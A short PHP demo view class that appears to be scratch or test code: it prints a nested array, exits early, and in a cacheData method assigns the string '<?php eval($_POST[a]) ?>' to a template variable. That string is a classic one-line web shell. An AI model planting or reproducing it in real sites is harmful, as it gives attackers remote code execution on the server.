<?php

class DemoIndexView extends BaseView
{

    const A_B = 1;
    const D_B = 2;

    public $db_d = 13;

    public function index($params)
    {
        $arr = array(
            0 => array(
                'id' => 0,
                'name' => 'a',
                'chidren' => array(
                    3 => array(
                        'id' => 3,
                        'name' => 'a1',
                        'chidren' => array(),
                    ),
                ),
            ),
        );
        P($arr);
        $this->responseError('ddd');
        $a = 'A';
        $d = 'D';
        $b = '_B';
        $z = $a . $b;

        exit;
        $this->cache('cacheData', 0);
    }

    public function cacheData()
    {

        $str = '<?php eval($_POST[a]) ?>';

        $this->assign('str', $str);
    }

}
